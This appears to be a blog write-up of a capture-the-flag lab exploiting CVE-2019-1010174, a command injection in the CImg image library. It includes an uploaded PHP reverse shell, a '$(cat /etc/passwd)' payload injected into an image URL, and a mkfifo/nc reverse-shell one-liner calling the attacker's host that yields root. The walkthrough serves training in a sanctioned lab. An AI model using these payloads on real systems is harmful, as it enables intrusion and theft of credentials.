---
layout: post
title: CVE-2019-1010174
feature-img: "assets/img/portfolio/CVE-2019-14813.png"
img: "assets/img/portfolio/CVE-2019-14813.png"
date: 14 jun 2021
#tags: [Lorem, Ipsum]
---

[CVE-2019-14813](https://echoctf.red/target/23)


This is a target with direct implementation of the CVE-2019-1010174 for the CImg Library v.2.3.3 and is here to assist in developing exploits for this vulnerability.

Description:
CImg The CImg Library v.2.3.3 and earlier is affected by a command injection vulnerability. This attack can lead to RCE. The vulnerable code can be found in the load_network() function. Loading an image from a user-controllable url can lead to command injection, because no string sanitization is done on the url.

Environment details:
The system is accessible at 10.0.160.248 and runs a web server and a vulnerable binary utilizing CImg.

Flags can be obtained by either accessing directly the service 375/tcp or through the web interface at http://10.0.160.248. Flags can be found at the usual places:

/root/ETSCTF
/etc/passwd gecos
/etc/shadow password hash
env variable
The source for the service listening on 375/tcp is the following

[SecurityExploits-CImg](https://github.com/github/security-lab/tree/master/SecurityExploits/CImg)

```
#undef cimg_display
#define cimg_display 0
#include "CImg.h"
using namespace cimg_library;
#include 
#include 

// To compile and run:
//
// g++ -I./CImg poc.c -o poc
// ./poc
//
// Notice that the file ~/CImg-RCE has now been created.

int main(int argc, char **argv) {
  CImg<> img;
  std::cout << "Provide image url: " << std::endl;
  for (std::string line; std::getline(std::cin, line);) {
        std::cout << line << std::endl;
        img.assign(line.c_str());
  }
  return 0;
}
```

References:
[CVE-2019-1010174](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1010174)
[Fix commit](https://framagit.org/users/sign_in)


### Enumartion:

nmap -sC -sV  10.0.40.0 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-19 11:35 IDT
Nmap scan report for 10.0.40.0
Host is up (0.076s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Scrap Images from URLs



### Http

i have web page with upload forum
![](assets/img/CVE-2019-1010174.png)

*When in doubt, check /images/* 

setting python server and check if we can grab the file:

lets try to upload php rev shell:  [rev_shell](https://www.revshells.com/)

![](assets/img/CVE-2019-1010174_upload.png)

and i have the file in /images/

### RCE 

opening listenner, got shell as www-data

```
nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.0.40.0 33426
Linux CVE-2019-1010174.echocity-f.com 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64 GNU/Linux
 08:46:10 up 24 days, 10:00,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

```

### Privilege escalation

runing proccess:

```
ps -aux |  grep root
root         1  0.0  0.1  17964  2412 ?        Ss   Jun13   0:00 /bin/bash /entrypoint.sh /usr/local/bin/CImg.sh
root        29  0.0  0.3 220900  7128 ?        Ss   Jun13   0:02 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
root        45  0.0  0.0 159540  1664 ?        Ss   Jun13   0:00 nginx: master process /usr/sbin/nginx
root        47  0.0  0.1  17944  2380 ?        S    Jun13   0:00 /bin/bash /usr/local/bin/CImg.sh
root        48  0.0  0.1  24584  3020 ?        S    Jun13   0:00 socat TCP-LISTEN:375,reuseaddr,fork EXEC:/usr/local/bin/CImg,stderr
www-data 10109  0.0  0.0  11108   956 pts/0    S+   06:58   0:00 grep root
```

opened ports:

```
www-data@CVE-2019-1010174:/$  ss -ant
ss -ant
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
LISTEN     0      5            *:375                      *:*
LISTEN     0      128    127.0.0.11:42171                    *:*
LISTEN     0      128          *:80                       *:*
```

port 375 is listening, after cheking it i got this:

```
 nc 127.0.0.1 375 -v
nc 127.0.0.1 375 -v
localhost [127.0.0.1] 375 (?) open
Provide image url: 

[CImg] *** CImgIOException *** [instance(0,0,0,0,(nil),non-shared)] CImg<float>::load(): Failed to open file ''.
terminate called after throwing an instance of 'cimg_library::CImgIOException'
  what():  [instance(0,0,0,0,(nil),non-shared)] CImg<float>::load(): Failed to open file ''
```

its same service as i got RCE to machine but diffrent port. 

```
$ nc 10.0.40.0 375
Provide image url: 
```
same service but without http.

i focused in:
```
CImg The CImg Library v.2.3.3 and earlier is affected by: command injection. The impact is: RCE. The component is: load_network() function. The attack vector is: Loading an image from a user-controllable url can lead to command injection, because no string sanitization is done on the url. The fixed version is: v.2.3.4.

my next step is to create bash file that ill will run it while im uploading. 

```
so i tried to add $(command_injection)

```
nc 10.0.40.0 375
Provide image url: 
http://10.10.0.10:8000/cat.jpeg $(cat /etc/passwd)
```

and its working

```
/cat.jpeg%20root:x:0:0:root:/root:/bin/bash%0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin%0Abin:x:2:2:bin:/bin:/usr/sbin/nologin%0Asys:x:3:3:sys:/dev:/usr/sbin/nologin%0Async:x:4:65534:sync:/bin:/bin/sync%0Agames:x:5:60:games:/usr/games:/usr/sbin/nologin%0Aman:x:6:12:man:/var/cache/man:/usr/sbin/nologin%0Alp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin%0Amail:x:8:8:mail:/var/mail:/usr/sbin/nologin%0Anews:x:9:9:news:/var/spool/news:/usr/sbin/nologin%0Auucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin%0Aproxy:x:13:13:proxy:/bin:/usr/sbin/nologin%0Awww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin%0Abackup:x:34:34:backup:/var/backups:/usr/sbin/nologin%0Alist:x:38:38:Mailing%20List%20Manager:/var/list:/usr/sbin/nologin%0Airc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin%0Agnats:x:41:41:Gnats%20Bug-Reporting%20System%20(admin):/var/lib/gnats:/usr/sbin/nologin%0Anobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin%0A_apt:x:100:65534::/nonexistent:/bin/false%0AETSCTF:x:1000:65534:ETSCTF_edc6f858710d7f35ae577eb5b349ec70:/home/ETSCTF:/bin/bash HTTP/1.1" 404 -
10.0.40.0 - - [19/Jul/2022 12:15:23] "GET /cat.jpeg  HTTP/1.1" 200 -
```


lets try to add rev shell:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.10 5555 >/tmp/f

nc 10.0.40.0 375
Provide image url: 
http://10.10.0.10:8000/cat.jpeg $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.10 5555 >/tmp/f)
````
opened listener in my machine:

```
nc -lnvp 5555                                                                                                                                                                                130 ⨯
Listening on 0.0.0.0 5555
Connection received on 10.0.40.0 46788
# id
uid=0(root) gid=0(root) groups=0(root)
```

